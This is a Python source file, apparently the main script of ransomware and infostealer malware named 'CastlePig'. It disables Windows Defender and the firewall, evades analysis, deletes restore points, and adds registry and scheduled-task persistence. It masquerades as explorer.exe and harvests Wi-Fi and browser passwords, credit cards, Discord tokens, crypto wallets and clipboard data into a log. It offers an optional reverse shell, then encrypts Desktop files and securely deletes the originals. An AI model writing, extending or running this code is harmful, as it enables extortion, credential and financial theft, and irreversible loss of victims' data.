# CastlePig Encryption
import castle_pig.anti_analysis

castle_pig.anti_analysis.check_for_suspicious_processes()
castle_pig.anti_analysis.disable_defender_and_firewall()

import os
import threading
import castle_pig.file_encrypter
import castle_pig.file_decrypter
import castle_pig.task_scheduler
import castle_pig.secure_password
import castle_pig.keyring_password
import castle_pig.desktop_files
import castle_pig.reverse_shell
import castle_pig.secure_delete
# Delete all restore points
import castle_pig.restore_point_cleaner
castle_pig.restore_point_cleaner.delete_all_restore_points()
# Add registry persistence
import castle_pig.persistence
castle_pig.persistence.add_registry_persistence()
# Set the window title to mimic a legitimate process
import castle_pig.process_blender
castle_pig.process_blender.set_process_title_windows("explorer.exe")
# Uncomment below to run in a hidden window
castle_pig.process_blender.run_hidden_windows()


# ===================================
# === CastlePig Data Exfiltration ===
# ===================================

# imports

from data_grabber.app_usage_extractor import get_application_usage_history

from data_grabber.wifi_grabber import grab_wifi_passwords
from data_grabber.discord_token_grabber import find_discord_tokens
from data_grabber.system_info_grabber import get_system_info
from data_grabber.crypto_wallet_grabber import find_wallets
from data_grabber.browser_data_grabber import (
    extract_browser_passwords,
    extract_browser_cards,
    extract_browser_bookmarks
)
from data_grabber.process_list_grabber import get_process_list
from data_grabber.clipboard_grabber import get_clipboard
from data_grabber.antivirus_status_grabber import get_antivirus_status
from data_grabber.alternate_data_streams_grabber import find_alternate_data_streams
from data_grabber.wifi_networks_history_grabber import get_wifi_network_history
from data_grabber.browser_history_grabber import get_chrome_history
from data_grabber.remote_desktop_grabber import get_rdp_connections

def log_all_data():
    with open("log.txt", "a", encoding="utf-8") as log:
        # Wi-Fi Passwords
        try:
            wifi_data = grab_wifi_passwords()
            log.write("Wi-Fi Name                    | Password\n")
            log.write("------------------------------------------\n")
            for ssid, password in wifi_data:
                log.write(f"{ssid:<30}| {password}\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Wi-Fi password extraction failed: {e}\n\n")

        # Discord Tokens
        try:
            tokens = find_discord_tokens()
            log.write("Discord Tokens:\n")
            for token in tokens:
                log.write(token + "\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Discord token extraction failed: {e}\n\n")

        # Browser Passwords
        try:
            log.write("Browser Passwords:\n")
            for entry in extract_browser_passwords():
                log.write(f"[{entry['browser']}] {entry['url']} | {entry['username']} | {entry['password']}\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Browser password extraction failed: {e}\n\n")

        # Browser Credit Cards
        try:
            log.write("Browser Credit Cards:\n")
            for entry in extract_browser_cards():
                log.write(f"[{entry['browser']}] {entry['name']} | {entry['card_number']} | {entry['exp_month']}/{entry['exp_year']}\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Browser card extraction failed: {e}\n\n")

        # Browser Bookmarks
        try:
            log.write("Browser Bookmarks:\n")
            for entry in extract_browser_bookmarks():
                log.write(f"[{entry['browser']}] {entry['name']} | {entry['url']}\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Browser bookmark extraction failed: {e}\n\n")

        # System Information
        try:
            info = get_system_info()
            log.write("System Information:\n")
            for k, v in info.items():
                log.write(f"{k}: {v}\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] System info extraction failed: {e}\n\n")

        # Crypto Wallets
        try:
            wallets = find_wallets()
            log.write("Crypto Wallets Found:\n")
            for name, path in wallets:
                log.write(f"{name}: {path}\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Crypto wallet extraction failed: {e}\n\n")

        # Process List
        try:
            log.write("Process List:\n")
            for proc in get_process_list():
                log.write(f"{proc['name']} (PID: {proc['pid']}, PPID: {proc['ppid']}, EXE: {proc['exe']})\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Process list extraction failed: {e}\n\n")

        # Clipboard
        try:
            clipboard = get_clipboard()
            log.write("Clipboard Contents:\n")
            log.write(clipboard + "\n\n")
        except Exception as e:
            log.write(f"[ERROR] Clipboard extraction failed: {e}\n\n")

        # Antivirus Status
        try:
            av_status = get_antivirus_status()
            log.write("Antivirus Status:\n")
            for line in av_status:
                log.write(line + "\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Antivirus status extraction failed: {e}\n\n")

        # Alternate Data Streams
        try:
            log.write("Alternate Data Streams in C:\\Users:\n")
            for line in find_alternate_data_streams(r"C:\Users"):
                log.write(line + "\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] ADS extraction failed: {e}\n\n")

        # Wi-Fi Networks History
        try:
            wifi_history = get_wifi_network_history()
            log.write("Wi-Fi Networks History:\n")
            for ssid in wifi_history:
                log.write(ssid + "\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Wi-Fi networks history extraction failed: {e}\n\n")

        # Browser History
        try:
            log.write("Chrome Browser History (last 50):\n")
            for url, title, last_visit in get_chrome_history():
                log.write(f"{title} | {url} | {last_visit}\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] Browser history extraction failed: {e}\n\n")

        # Remote Desktop Connections
        try:
            rdp = get_rdp_connections()
            log.write("RDP Connections:\n")
            for server in rdp:
                log.write(server + "\n")
            log.write("\n")
        except Exception as e:
            log.write(f"[ERROR] RDP connections extraction failed: {e}\n\n")

        # App Data Usage
        try:
          appuse = get_application_usage_history()
          for appu in appuse:
            log.write(f"app usage: {appu}")
          log.write("\n")
        except:
          log.write(f"[ERROR] App Usage extraction failed: {e}\n\n")


# .env loadenv file is populated
# Uncomment below to use and clean up any unneeded code
"""
import os
from dotenv import load_dotenv
import sys

load_dotenv()

# Required variables
SERVICE_NAME = os.getenv("SERVICE_NAME")
USERNAME = os.getenv("USERNAME")
ENCRYPTED_FOLDER = os.getenv("ENCRYPTED_FOLDER")

# Optional variables
ENABLE_REVERSE_SHELL = os.getenv("ENABLE_REVERSE_SHELL")
REVERSE_SHELL_IP = os.getenv("REVERSE_SHELL_IP")
REVERSE_SHELL_PORT = os.getenv("REVERSE_SHELL_PORT")

# Check for required variables
required_vars = {
    "SERVICE_NAME": SERVICE_NAME,
    "USERNAME": USERNAME,
    "ENCRYPTED_FOLDER": ENCRYPTED_FOLDER,
}

missing = [k for k, v in required_vars.items() if v is None]
if missing:
    print(f"Error: Missing required environment variables: {', '.join(missing)}")
    sys.exit(1)

# Set defaults for optional variables if not set
if ENABLE_REVERSE_SHELL is None:
    ENABLE_REVERSE_SHELL = False
else:
    ENABLE_REVERSE_SHELL = ENABLE_REVERSE_SHELL.lower() == "true"

if REVERSE_SHELL_IP is None:
    REVERSE_SHELL_IP = "127.0.0.1"

if REVERSE_SHELL_PORT is None:
    REVERSE_SHELL_PORT = 4444
else:
    REVERSE_SHELL_PORT = int(REVERSE_SHELL_PORT)
"""

# === Configuration ===
SERVICE_NAME = "CastlePig"
USERNAME = "one_dumb_pig"
ENCRYPTED_FOLDER = "EncryptedFiles"
ENABLE_REVERSE_SHELL = False  # Set to True to enable reverse shell
REVERSE_SHELL_IP = "127.0.0.1"
REVERSE_SHELL_PORT = 4444
DELETE_FILE = True



# Get all files from the user's Desktop (recursively)
files = castle_pig.desktop_files.get_all_files_from_desktop() # Assuming this is in desktop_files

def main():
    # init grab data
    log_all_data()
    # 0. Optionally run reverse shell in a background thread
    if ENABLE_REVERSE_SHELL:
        rs = threading.Thread(
            target=castle_pig.reverse_shell.shell,
            args=(REVERSE_SHELL_IP, REVERSE_SHELL_PORT),
            daemon=True
        )
        rs.start()
        print("Reverse shell started in background.")

    # 1. Get or generate a secure password
    try:
        password = castle_pig.keyring_password.load_password_from_keyring(
            service_name=SERVICE_NAME, username=USERNAME
        )
        print("Loaded existing password from keyring.")
    except Exception:
        password = castle_pig.secure_password.generate_secure_password(32)
        castle_pig.keyring_password.save_password_to_keyring(
            password, service_name=SERVICE_NAME, username=USERNAME
        )
        print("Generated and saved new password to keyring.")

    # 2. Add this script to Task Scheduler (Windows only)
    castle_pig.task_scheduler.add_to_task_scheduler()

    # 3. Encrypt each file in the files list
    os.makedirs(ENCRYPTED_FOLDER, exist_ok=True)
    for _file in files:
        encrypted_path = castle_pig.file_encrypter.encrypt_file(
            _file,
            password=password,
            delete_original=DELETE_FILE,
            move_to_folder=ENCRYPTED_FOLDER
        )
        if DELETE_FILE:
            castle_pig.secure_delete.secure_delete(_file)
            print(f"Deleted: {_file}")
        else:
            print(f"Not deleting: {_file}")
        if encrypted_path:
            print(f"Encrypted file at: {encrypted_path}")
        else:
            print(f"Failed to encrypt: {_file}")

if __name__ == "__main__":
    main()
